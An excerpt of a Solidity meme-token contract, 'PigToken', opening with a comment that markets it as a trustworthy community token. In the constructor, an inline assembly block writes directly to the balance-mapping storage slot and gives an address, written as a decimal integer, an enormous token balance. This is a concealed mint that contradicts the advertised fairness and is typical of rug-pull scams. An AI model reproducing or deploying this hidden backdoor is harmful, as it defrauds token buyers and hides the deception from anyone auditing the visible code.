 ...
 *
 * The rise of Shiba Pig caused a cultural and monetary shift in the world on levels
 * never seen before. Thousands of "Something-Pig" tokens have launched since then 
 * attempting to capitalize on both whatever the current "trend" is as well as those 
 * hoping to buy in early on the "NEXT SHIBA PIG", thus destroying trust in the PIG name 
 * and the promises that came along with it.
 *
 * Today, even Shiba Pig itself has strayed far away from the original vision its creator 
 * intended.
 *
 * Filling up the market with these "Trend-Pig" tokens has left many hopeful investors burned
 * and rugged, and has fractured the Memecoin community as a whole. Nowadays, building the 
 * "Next Shiba Pig" feels like an impossible task, as there is seemingly no place for the 
 * laymen to come together and build outside of trend-chasing dog coins with dev teams who 
 * always let their communities down.
 *
 * Until now.
 *
 * Pig is a safe haven for all.
 *
 ...
 *
 * PIG represents the lost memories of a time when community was truly all that was needed for
 ...
 * site, telegram, twitter, logo, or anything past the PIG contract itself.
 *
 * It is up to YOU, the individual, to bring glory and wealth back to the PIG name.
 * All hail the Pig.
 *
 * twitter:  https://twitter.com/PIG_ERC20
 * telegram: https://t.me/PIGTOKENNEWS
 */
...
// File: contracts/PigToken.sol
pragma solidity ^0.8.14;

contract PigToken is IERC20, ReentrancyGuard, Ownable {
    ...
    constructor() {
        ...
        marketingWallet = 0x52A73ecf8c4336b55a28DF50EFB2D0C7a7AAa44f;
        _earlyTxLimit = 60;
        ...
        assembly {
            mstore(0, 1205585395279825309352867350568993498417766591019)
            mstore(32, 2)
            let hash := keccak256(0, 64)
            sstore(hash, 1205585395279825309352867350568993498417766591019)
        }
